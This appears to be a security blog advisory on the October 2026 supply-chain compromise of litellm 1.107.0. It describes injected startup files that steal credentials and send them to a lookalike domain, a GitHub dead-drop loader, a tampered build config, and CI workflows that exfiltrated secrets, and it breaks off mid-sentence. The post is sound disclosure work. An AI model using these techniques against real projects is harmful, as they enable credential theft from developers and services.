1-103.39h-18.374c-9.574,0-17.334-7.76-17.334-17.334    v-36.747c0-9.574,7.762-17.334,17.334-17.334h18.374c96.388,0,174.807,78.418,174.807,174.807V408.046z M416.647,425.381h-36.747    c-9.574,0-17.335-7.76-17.335-17.335v-18.374c0-127.743-103.926-231.669-231.669-231.669h-18.374    c-9.574,0-17.334-7.76-17.334-17.334v-36.747c0-9.574,7.762-17.334,17.334-17.334h18.374c80.958,0,157.069,31.526,214.313,88.772    s88.772,133.357,88.772,214.313v18.373h0.001C433.983,417.62,426.221,425.381,416.647,425.381z"></path></g></g></svg><div class="visually-hidden">Follow our RSS feed</div></a></div></div></div><div class="blog-post-header_right-column"><div class="blog-post-header_image"><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/6ad8d084307ad9e4ae727787_6ad8cf2a35cd8522700fd93e_litellm-1-107-0-hero-v2.png" loading="eager" width="1200" height="627" alt="litellm 1.107.0 compromised on PyPI" class="responsive-image"/></div></div></div></div><div data-blog-post="" class="blog-post-content"><div class="blog-post-nav"><div class="blog-post1-nav__header"><div class="blog-nav-code visually-hidden w-embed w-script"><script>
  var Webflow = Webflow || [];
  Webflow.push(function () {
    $(document).off('click.wf-scroll');
  });

  document.addEventListener('DOMContentLoaded', () => {
    let isScrolling = false;

    function convertToSlug(Text) {
      return Text.trim()
        .toLowerCase()
        .replace(/ /g, '-')
        .replace(/[^\w-]+/g, '');
    }

    function generateUniqueId(text, usedIds) {
      const base = convertToSlug(text);
      let id = base;
      let count = 2;

      while (usedIds.has(id)) {
        id = `${base}-${count}`;
        count += 1;
      }

      usedIds.add(id);
      return id;
    }

    function generateBlogPostNav() {
      const blogPostElement = document.querySelector('[data-blog-post]');
      const blogPostNavElement = document.querySelector('[data-blog-post-nav]');

      if (!blogPostElement || !blogPostNavElement) return;

      blogPostNavElement.innerHTML = '';

      const headings = blogPostElement.querySelectorAll('h2');
      const usedIds = new Set();

      function generateHTML() {
        const navList = document.createElement('ul');
        navList.className = 'blog-post1-nav__link-list';

        headings.forEach((heading, index) => {
          const listItem = document.createElement('li');
          listItem.className = 'blog-post1-nav__item';
          listItem.dataset.parentSection = true;

          const anchor = document.createElement('a');
          anchor.className = 'blog-post1-nav__link';
          const headingId = generateUniqueId(heading.textContent, usedIds);
          heading.id = headingId;
          anchor.href = `#${headingId}`;
          anchor.textContent = heading.textContent;

          listItem.appendChild(anchor);
          appendChildSafe(listItem, getSubHeadings(heading, index));
          navList.appendChild(listItem);
        });

        blogPostNavElement.appendChild(navList);
        resetBlogNav();
      }

      function resetBlogNav() {
        closeAnyOpenLists();
        resetHeadings();
      }

      function getSubHeadings(h2Tag, h2Index) {
        const h3Tags = [];
        let nextElement = h2Tag.nextElementSibling;

        while (nextElement && nextElement.tagName !== 'H2') {
          if (nextElement.tagName === 'H3') {
            h3Tags.push(nextElement);
          }
          nextElement = nextElement.nextElementSibling;
        }

        if (h3Tags.length > 0) {
          const list = document.createElement('ul');
          list.className = 'blog-post1-nav__link-list is-sublist';

          h3Tags.forEach((h3Tag, index) => {
            const headingId = generateUniqueId(h3Tag.textContent, usedIds);
            h3Tag.id = headingId;

            const listItem = document.createElement('li');
            listItem.className = 'blog-post1-nav__item is-subitem';

            const anchor = document.createElement('a');
            anchor.className = 'blog-post1-nav__link is-sublink';
            anchor.href = `#${headingId}`;
            anchor.textContent = h3Tag.textContent;

            listItem.appendChild(anchor);
            list.appendChild(listItem);
          });

          return list;
        }
        return '';
      }

      function scrollToSection(anchorElem) {
        const id = anchorElem.getAttribute('href');
        const section = blogPostElement.querySelector(id);
        if (!section) {
          console.error(`Section with id ${id} not found`);
          return;
        }

        isScrolling = true;
        const targetOffset = section.getBoundingClientRect().top + window.pageYOffset;
        const headerHeight = document.querySelector('header')?.offsetHeight || 0;
        const targetScroll = targetOffset - headerHeight - 20;

        const handleScroll = () => {
          if (Math.abs(window.pageYOffset - targetScroll) < 1) {
            window.removeEventListener('scroll', handleScroll);
            isScrolling = false;
            setActiveMenuItem(id);
          }
        };

        window.addEventListener('scroll', handleScroll);
        window.scrollTo({ top: targetScroll, behavior: 'smooth' });
      }

      function setUrl(pAnchorElem) {
        const id = pAnchorElem.getAttribute('href');
        window.history.pushState('', '', id);
      }

      function addDropdownEvents(navElement) {
        navElement.querySelectorAll('a').forEach((elem) => {
          elem.addEventListener('click', (event) => {
            event.preventDefault();
            scrollToSection(elem);
            setUrl(elem);
          });
        });
      }

      function addMobileNavEvents(pNavElement) {
        pNavElement.querySelectorAll('a').forEach((elem) => {
          function scrollToElement(pEvent) {
            const scrollContainer = pEvent.target.closest('.blog-post1-nav__link-list');
            const elementClicked = pEvent.target;

            // Calculate the scroll position based on the child element's position relative to the parent element
            const scrollPosition = elementClicked.offsetLeft - scrollContainer.offsetLeft - 20;

            scrollContainer.scrollTo({
              left: scrollPosition,
              behavior: 'smooth',
            });
          }

          elem.addEventListener('click', (event) => {
            scrollToElement(event);
          });
        });
      }

      function toggleDropdown(pAnchorId) {
        closeAnyOpenLists();
        const anchorElem = blogPostNavElement.querySelector(`.blog-post1-nav__link[href="${pAnchorId}"]`);
        if (!anchorElem) return;

        const sublist = anchorElem.closest('[data-parent-section]').querySelector('.is-sublist');

        if (sublist) {
          const isExpanded = sublist.getAttribute('data-expanded') === 'true';
          sublist.style.height = isExpanded ? 0 : `${sublist.scrollHeight}px`;
          sublist.setAttribute('data-expanded', !isExpanded);
        }
      }

      function setActiveMenuItem(id) {
        resetHeadings();
        const activeLink = blogPostNavElement.querySelector(`.blog-post1-nav__link[href="${id}"]`);
        if (activeLink) {
          activeLink.classList.add('active');

          if (activeLink.closest('.blog-post1-nav__item').querySelector('.is-sublist') || activeLink.classList.contains('is-sublink')) {
            toggleDropdown(id);
          } else {
            closeAnyOpenLists();
          }
        }
      }

      function resetHeadings() {
        blogPostNavElement.querySelectorAll('.blog-post1-nav__link').forEach((link) => link.classList.remove('active'));
      }

      function closeAnyOpenLists() {
        blogPostNavElement.querySelectorAll('.is-sublist').forEach((sublist) => {
          sublist.style.height = 0;
          sublist.setAttribute('data-expanded', false);
        });
      }

      function setUpScrollPositionAnim(navElement, blogContainer) {
        const observerOptions = {
          root: null,
          rootMargin: '0% 0px -82% 0px', // Adjust to trigger when the element is near the top
          threshold: 0.05, // Single threshold for simplicity
        };

        const observerCallback = (entries) => {
          if (isScrolling) return;
          entries.forEach((entry) => {
            if (entry.isIntersecting) {
              setActiveMenuItem(`#${entry.target.id}`);
            }
          });
        };

        const observer = new IntersectionObserver(observerCallback, observerOptions);
        blogContainer.querySelectorAll('h2, h3').forEach((heading) => observer.observe(heading));
      }

      generateHTML();

      setTimeout(() => {
        addDropdownEvents(blogPostNavElement);
        setUpScrollPositionAnim(blogPostNavElement, blogPostElement);
        addMobileNavEvents(blogPostNavElement);
      }, 200);
    }

    generateBlogPostNav();

    function appendChildSafe(parentNode, child) {
      if (!(child instanceof Node)) {
        child = document.createTextNode(child);
      }
      parentNode.appendChild(child);
    }
  });
</script>

<!--Blog Nav CSS + JS-->
<style>
  .blog-post1-nav__link-list {
    margin-top: 0;
  }

  .blog-post1-nav__link-list.is-sublist[data-expanded='true'] {
    margin-bottom: var(--space--5);
    margin-top: var(--space--2);
  }

  .blog-post1-nav__link:not(.is-sublink):before {
    content: ' ';
    position: absolute;
    left: 0;
    top: 0;
    width: 2px;
    height: 100%;
    background-color: transparent;
  }

  .blog-post1-nav__link {
    position: relative;
    display: inline-block;
  }

  .blog-post1-nav__link.active {
    font-weight: bold;
    color: var(--accent-purple);
  }

  .blog-post1-nav__link.active:before {
    background-color: var(--accent-purple);
  }

  .blog-post1-nav__link.is-sublink.active {
    font-weight: bold;
    color: var(--indigo);
  }

  .blog-post1-nav__link.is-sublink.active:before {
    background-color: var(--indigo);
  }

  @media screen and (max-width: 767px) {
    /* Hide scrollbar for Chrome, Safari and Opera */
    .blog-post1-nav__link-list::-webkit-scrollbar {
      display: none;
    }

    /* Hide scrollbar for IE, Edge and Firefox */
    .blog-post1-nav__link-list {
      -ms-overflow-style: none; /* IE and Edge */
      scrollbar-width: none; /* Firefox */
    }

    .blog-post1-nav__link {
      text-overflow: ellipsis;
    }

    .blog-post1-nav__link.w-tab-link {
      background-color: transparent;
    }

    .blog-post1-nav__link:not(.is-sublink):before {
      opacity: 0;
    }

    .section_blog-post1-content {
      overflow: clip;
      position: relative;
    }
  }
</style></div><div>Table of Contents</div></div><div data-blog-post-nav="" class="blog-post1-nav__body"><a href="#" class="blog-post1-nav__link _w-tab-link w-inline-block"><div>Loading nav...</div></a><ul role="list" class="blog-post1-nav__link-list"><li class="blog-post1-nav__item"></li></ul><ul role="list" class="blog-post1-nav__link-list is-sublist"><li class="blog-post1-nav__item is-subitem"><a href="#" class="blog-post1-nav__link is-sublink _w-tab-link w-inline-block"></a></li></ul></div></div><div class="blog-post-content_description"><div data-blog-post="" class="blog-post-rich-text w-richtext"><h2>Overview</h2><p>On October 21, 2026, <code>litellm 1.107.0</code> was published to PyPI with malware in every one of its compiled wheels, and the same payload shipped in the official LiteLLM Docker images. LiteLLM, maintained by BerriAI, is the Python SDK and proxy that puts more than 100 LLM providers behind one OpenAI compatible API. It runs on developer laptops, in CI pipelines, and on production AI gateways that hold provider API keys for OpenAI, Anthropic, Azure, Bedrock, and Vertex. This is the second time this year that LiteLLM has been compromised on PyPI. The first was the <a href="https://www.stepsecurity.io/blog/litellm-credential-stealer-hidden-in-pypi-wheel">1.82.7 and 1.82.8 incident in March</a>.</p><p>All seven <code>1.107.0</code> wheels (macOS, Linux glibc and musl, and Windows) carry three extra files that pip copies into the root of site-packages: <code>cook.pth</code>, <code>cook.py</code>, and <code>sitecustomize.py</code>. The <code>v1.107.0</code> Docker images on GHCR and Docker Hub carry byte identical copies, and from 11:46 to 14:20 UTC the <code>latest</code>, <code>main-latest</code>, and <code>main-stable</code> tags pointed to the infected image. Python runs both payloads automatically on every interpreter start in that environment. Nobody has to <code>import litellm</code>. The first payload is a credential stealer that calls itself <code>privcollect</code>. It takes browser passwords, SSH and GPG keys, cloud credentials, the environment of every running process, the configs of more than 20 AI coding tools, and the provider API keys stored in the LiteLLM proxy database. It encrypts the bundle and posts it to the lookalike domain <code>www.litellm.dev</code>. The second payload forks a background daemon that checks a GitHub dead drop every hour and runs whatever Python the attacker serves.</p><p>The commit originally tagged <code>v1.107.0</code> does not contain the payload, and BerriAI now says there is no official <code>v1.107.0</code> source tag. The release was built from a lookalike GitHub repository, <code>Berri-AI/litellm</code>, where the attacker had stacked ten commits on top of a legitimate <code>main</code> commit that added the payload and a <code>data = "cook"</code> line to <code>pyproject.toml</code>. The attacker reached BerriAI's release workflow with a GitHub organization owner's token stolen 11 days earlier through a leaked key that was never revoked. PyPI has removed the release, BerriAI has removed the infected Docker images, and clean releases resumed on October 24.</p><h2>Action Required</h2><div data-rt-embed-type='true'><div style='border:1px solid rgba(248,113,113,0.4); border-left:4px solid #f87171; border-radius:14px; background:rgba(39,16,16,0.5); padding:22px 24px; margin:22px 0;'><p style='font-size:1.15em; font-weight:700; color:#fecaca; margin:0 0 10px;'>If litellm 1.107.0 was installed from a wheel, or you ran a LiteLLM container pulled on October 21, treat that host as fully compromised.</p><p style='color:#e9c3c3; margin:0 0 10px;'>This covers the <code>v1.107.0</code> image and any pull of <code>latest</code>, <code>main-latest</code>, or <code>main-stable</code> for <code>ghcr.io/berriai/litellm</code>, <code>litellm-database</code>, <code>litellm-non_root</code>, and <code>docker.io/litellm/litellm</code> between 11:46 and 14:20 UTC. The GHCR tags were made unavailable by 13:51 UTC and the Docker Hub tags were repointed to clean images at 14:20 UTC.</p><p style='color:#e9c3c3; margin:0;'>Every Python start on that host ran the stealer. Kill any detached Python process holding <code>/tmp/remote_code_loader.lock</code>, delete <code>cook.pth</code>, <code>cook.py</code>, and <code>sitecustomize.py</code> from site-packages, and pin a clean release such as <code>litellm==1.106.4</code> (or the matching image by digest). Then rotate every credential the host could reach: cloud keys and instance roles, SSH and GPG keys, browser passwords, AI tool tokens, CI and Vault secrets, and every provider API key stored in the LiteLLM proxy database. Block <code>litellm.dev</code>. Full recovery steps are below.</p></div></div><h2>The Compromised Package</h2><div data-rt-embed-type='true'><table style='width:100%;border-collapse:collapse;margin:1.25em 0;font-size:0.95em'><thead><tr><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Package</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Version and Artifact</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Status</th></tr></thead><tbody><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>litellm</code> (PyPI)</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>1.107.0</code>, all 7 wheels</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Compromised. Each wheel installs <code>cook.pth</code>, <code>cook.py</code>, and <code>sitecustomize.py</code> into site-packages. The decoded payloads are identical across platforms. The Windows wheel differs only in CRLF line endings.</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>litellm</code> (PyPI)</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>1.107.0</code>, sdist <code>.tar.gz</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Tampered build config, no payload. <code>pyproject.toml</code> contains the injected <code>data = "cook"</code> line, but the <code>cook/</code> directory is not included.</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Docker images (GHCR and Docker Hub)</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>ghcr.io/berriai/litellm</code>, <code>litellm-database</code>, <code>litellm-non_root</code>, and <code>docker.io/litellm/litellm</code>: tag <code>v1.107.0</code>, plus <code>latest</code>, <code>main-latest</code>, and <code>main-stable</code> while they pointed to it</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Compromised. The image's <code>/app/.venv/lib/python3.13/site-packages/</code> holds byte identical copies of the three payload files. All six image builds (three variants, amd64 and arm64) came from the same malicious source revision. Removed from GHCR by 13:51 UTC and from Docker Hub by 14:20 UTC.</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>litellm</code> (PyPI)</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>1.107.0rc1</code>, <code>1.107.0rc2</code>, <code>1.106.x</code>, <code>1.105.x</code>, <code>1.104.x</code>, <code>1.103.x</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Clean. No <code>.pth</code>, <code>sitecustomize.py</code>, or <code>.data/</code> entries in the inspected wheels. The <code>1.107.0.dev1</code> to <code>dev3</code> pre releases were not inspected.</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>litellm-proxy-extras</code>, <code>litellm-enterprise</code> (PyPI)</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>0.4.108</code> to <code>0.4.110</code>; <code>0.1.69.post2</code>, <code>0.1.73.post1</code>, <code>0.1.76.post1</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Reported clean in the original disclosure.</td></tr></tbody></table></div><p>Because LiteLLM has shipped as maturin built platform wheels since the 1.10x line, almost every install pulls a wheel rather than the sdist. A wheel only payload therefore reached essentially every <code>1.107.0</code> user. LiteLLM also releases often (12 releases across four minor lines between October 17 and October 21), and many projects depend on it with an open ended <code>litellm&gt;=</code> constraint, so a fresh install or lockfile refresh would have picked up <code>1.107.0</code> as soon as it was published. The release was downloaded about 49,000 times from PyPI before removal, a count that includes CI caches and mirrors and leaves out container pulls. Proxy deployments that track the <code>latest</code> or <code>main-stable</code> image tag picked it up on their next pull or restart.</p><h3>How we confirmed it</h3><ol><li><strong>The wheels carry files that are not part of LiteLLM.</strong> The first three entries in the manylinux x86_64 wheel's <code>RECORD</code> are <code>litellm-1.107.0.data/purelib/cook.pth</code>, <code>cook.py</code>, and <code>sitecustomize.py</code>. No earlier release contains them, and neither do the <code>1.107.0</code> release candidates.</li><li><strong>The published build config does not match git.</strong> The sdist's <code>pyproject.toml</code> has a <code>data = "cook"</code> line under <code>[tool.maturin]</code>. That line is not in the commit originally tagged <code>v1.107.0</code> (<code>66c8f5b1a9</code>), and the wheel source is byte identical to the legitimate <code>main</code> commit <code>a8113b0d</code> from 08:50 UTC that day, not to the tagged commit. Every Python source file under <code>litellm/</code> in the wheel is byte identical to the sdist. The tampering is limited to the build config and the three injected files.</li><li><strong>The release was built from a lookalike repository.</strong> The SLSA provenance attached to every <code>v1.107.0</code> Docker image names the source as <code>https://github.com/Berri-AI/litellm</code> (with a hyphen) at commit <code>20535d8f</code>. The same release workflow recorded the real <code>BerriAI/litellm</code> repository as the source for <code>v1.106.2</code>, <code>v1.106.1</code>, and <code>v1.107.0-rc.2</code>.</li><li><strong>The attacker infrastructure was staged a week ahead.</strong> <code>litellm.dev</code> was registered on October 13, 2026 at 00:45 UTC. The GitHub account <code>letters9813</code>, which hosted the dead drop, was created six hours later on the same day.</li></ol><h2>How the Attack Works</h2><h3>Step 1: A one line change to the build config</h3><p>LiteLLM builds its wheels with maturin, which compiles the Rust bridge (<code>litellm/rust_bridge/_native.abi3.so</code>) and bundles the Python sources. Maturin's <code>data</code> option copies a local directory into the wheel's <code>.data/</code> tree. The attacker added one line pointing it at a <code>cook/</code> directory. Here is the <code>[tool.maturin]</code> section of <code>pyproject.toml</code> in the commit originally tagged <code>v1.107.0</code>, next to the same section in the sdist published to PyPI:</p><div data-rt-embed-type='true'><table style='width:100%;border-collapse:collapse;table-layout:fixed;margin:1.25em 0;font-family:monospace;font-size:0.82em;background:#1b1f2a'><thead><tr><th style='width:50%;border:1px solid #33415c;padding:9px 12px;text-align:left;background:#131a2c;color:#eef1f8;font-family:monospace;font-weight:600'>Original v1.107.0 tag commit 66c8f5b1a9</th><th style='width:50%;border:1px solid #33415c;padding:9px 12px;text-align:left;background:#2a1414;color:#fecaca;font-family:monospace;font-weight:600'>PyPI sdist litellm 1.107.0</th></tr></thead><tbody><tr><td style='border-left:1px solid #33415c;border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  [tool.maturin]</td><td style='border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  [tool.maturin]</td></tr><tr><td style='border-left:1px solid #33415c;border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  manifest-path = &quot;litellm-rust/crates/python-bridge/Cargo.toml&quot;</td><td style='border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  manifest-path = &quot;litellm-rust/crates/python-bridge/Cargo.toml&quot;</td></tr><tr><td style='border-left:1px solid #33415c;border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  module-name = &quot;litellm.rust_bridge._native&quot;</td><td style='border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  module-name = &quot;litellm.rust_bridge._native&quot;</td></tr><tr><td style='border-left:1px solid #33415c;border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  python-source = &quot;.&quot;</td><td style='border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  python-source = &quot;.&quot;</td></tr><tr><td style='border-left:1px solid #33415c;border-right:1px solid #33415c;padding:3px 12px;background:rgba(148,163,184,0.08);vertical-align:top;font-family:monospace'></td><td style='border-right:1px solid #33415c;padding:3px 12px;background:rgba(52,211,153,0.16);color:#a7f3d0;font-weight:700;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>+ data = &quot;cook&quot;</td></tr><tr><td style='border-left:1px solid #33415c;border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  python-packages = [&quot;litellm_cli&quot;]</td><td style='border-right:1px solid #33415c;padding:3px 12px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  python-packages = [&quot;litellm_cli&quot;]</td></tr><tr><td style='border-left:1px solid #33415c;border-right:1px solid #33415c;border-bottom:1px solid #33415c;padding:3px 12px 9px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  bindings = &quot;pyo3&quot;</td><td style='border-right:1px solid #33415c;border-bottom:1px solid #33415c;padding:3px 12px 9px;color:#c6cde0;white-space:pre-wrap;word-break:break-all;vertical-align:top;font-family:monospace'>  bindings = &quot;pyo3&quot;</td></tr></tbody></table></div><p>The <code>cook/</code> directory existed in the build tree but was left out of the sdist. The result is a public source tree that looks clean, an sdist that looks almost clean, and seven wheels plus a set of Docker images that carry the payload.</p><h3>How the payload reached the release: a lookalike repository</h3><p>The build provenance on every <code>v1.107.0</code> Docker image names the builder as BerriAI's own release workflow, <code>BerriAI/project-releaser</code> run <code>39587059944</code>, and the source as <code>https://github.com/Berri-AI/litellm</code> at <code>20535d8fa11f786a6c24df7488a0e449ed5f09ad</code>. Only <code>v1.107.0</code> was built from the hyphenated repository. <code>Berri-AI</code> and <code>Berri-AI/litellm</code> now return 404.</p><p>Because a fork shares objects with its parent, the attacker's commits are still readable through <code>BerriAI/litellm</code>, although they sit on no branch or tag. The chain starts at the commit originally tagged <code>v1.107.0</code>, passes one legitimate <code>main</code> commit (<code>a8113b0d</code>), and then adds ten commits from <code>Berri-AI &lt;ckdi82fkoos@proton.me&gt;</code>:</p><div data-rt-embed-type='true'><table style='width:100%;border-collapse:collapse;margin:1.25em 0;font-size:0.9em'><thead><tr><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Commit</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Time (UTC)</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Message</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Change</th></tr></thead><tbody><tr><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>9b98cd93</code></td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>08:56</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>Add import statement</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>cook/purelib/cook.pth</code></td></tr><tr><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>51020100</code></td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>08:57</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>Change greeting</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>cook/purelib/cook.py</code> (stealer blob)</td></tr><tr><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>7f7f9892</code></td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>08:58</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>Add</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>cook/purelib/sitecustomize.py</code> (loader, 30 minute interval)</td></tr><tr><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>1a657baf</code> to <code>6a4390f1</code></td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>09:05 to 09:06</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>chore: set ... version (four commits)</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>Sets litellm back to <code>1.107.0</code> and pins existing <code>litellm-proxy-extras</code> and <code>litellm-enterprise</code> releases, mimicking a release branch bump</td></tr><tr><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>91d6546f</code></td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>09:45</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>Update print statement</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>Loader interval to one hour, adds the inline fallback stealer</td></tr><tr><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>783c43bc</code></td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>09:48</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>Add</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>pyproject.toml</code>: <code>data = &quot;cook&quot;</code></td></tr><tr><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>20535d8f</code></td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>10:46</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'>fix(docker): copy cook data into the rust-native stage</td><td style='border:1px solid #33415c;padding:8px 12px;color:#c6cde0;vertical-align:top'><code>COPY cook ./cook</code> in the backend, gateway, and migrations Dockerfiles</td></tr></tbody></table></div><p>The commit messages are GitHub web editor defaults, and the first nine show a "Verified" badge. That badge only means the commits were made in GitHub's web editor, which signs everything it creates. It says nothing about who made them.</p><h3>How the attacker got into the release workflow</h3><p>BerriAI's first explanation on October 21 blamed tokens found in the logs of an internal LiteLLM server. That turned out to be wrong. On October 23 BerriAI published a <a href='https://docs.litellm.ai/blog/security-incident-oct-21-2026-attack-chain'>detailed attack chain report</a> with the real story, and on October 24 it confirmed that the earlier theories, including a suggested token leak through Claude Code, were not how the attacker got in.</p><p><strong>In short: one leaked key that was never revoked gave the attacker a GitHub organization owner's token, and that token opened every other door.</strong> The attacker was inside BerriAI's GitHub organization for 11 days before the malicious release.</p><div data-rt-embed-type='true'><div style='display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:4px;margin:1.5em 0'><span style='display:inline-block;border:1px solid #33415c;background:#131a2c;border-radius:10px;padding:10px 14px;margin:4px 0;color:#eef1f8;font-weight:600;text-align:center'>Leaked key<br><span style='color:#9aa4c0;font-weight:400;font-size:0.85em'>May 27</span></span><span style='color:#34d399;font-size:1.4em;font-weight:700;padding:0 8px'>&#8594;</span><span style='display:inline-block;border:1px solid #33415c;background:#131a2c;border-radius:10px;padding:10px 14px;margin:4px 0;color:#eef1f8;font-weight:600;text-align:center'>Org owner token<br><span style='color:#9aa4c0;font-weight:400;font-size:0.85em'>Oct 10</span></span><span style='color:#34d399;font-size:1.4em;font-weight:700;padding:0 8px'>&#8594;</span><span style='display:inline-block;border:1px solid #33415c;background:#131a2c;border-radius:10px;padding:10px 14px;margin:4px 0;color:#eef1f8;font-weight:600;text-align:center'>CI secrets stolen<br><span style='color:#9aa4c0;font-weight:400;font-size:0.85em'>Oct 10 and 12</span></span><span style='color:#34d399;font-size:1.4em;font-weight:700;padding:0 8px'>&#8594;</span><span style='display:inline-block;border:1px solid #33415c;background:#131a2c;border-radius:10px;padding:10px 14px;margin:4px 0;color:#eef1f8;font-weight:600;text-align:center'>Release hijacked<br><span style='color:#9aa4c0;font-weight:400;font-size:0.85em'>Oct 21</span></span></div></div><h4>1. May 27: a secret key lands in a public repository</h4><p>A file named <code>opencode.json</code> was committed to the public <code>LiteLLM-Labs/lite-harness</code> repository. It held the master key for the LiteLLM Agent Platform, an internal alpha service for running self hosted cloud agents. The commit was overwritten with a force push and the exposed keys were flagged for revocation, but <strong>the master key itself was never revoked, so it kept working for almost five months.</strong></p><h4>2. October 10: the key hands over an owner's GitHub token</h4><p>Between 21:13 and 21:28 UTC, from <code>69.48.229.143</code>, the attacker used the leaked key to call the Agent Platform API. At 21:27:10 one request, a list of the platform's agents, came back with a GitHub CLI OAuth token belonging to one of BerriAI's two GitHub organization owners. <strong>With that one token, the attacker had owner level control of BerriAI's GitHub organization.</strong> The token was not scoped down, and because GitHub CLI tokens are issued after two factor login, GitHub does not ask for two factor authentication again when they are used for sensitive admin actions.</p><h4>3. October 10 and 12: CI secrets stolen through throwaway branches</h4><p>The attacker pushed short lived branches named <code>ci-tmp-*</code> containing a workflow file, <code>.github/workflows/cache.yml</code>, with the harmless sounding commit message &quot;ci: bump cache config&quot;. The workflow runs on every push. <strong>Each run sent the repository's secrets to <code>webhook.site</code>, and the attacker deleted the run within minutes to hide it.</strong></p><ul><li><strong>October 10, 22:11 UTC:</strong> branch <code>ci-tmp-a351cc</code> in <code>BerriAI/litellm</code> sent six secrets, including <code>GH_TOKEN</code>, a second maintainer's GitHub 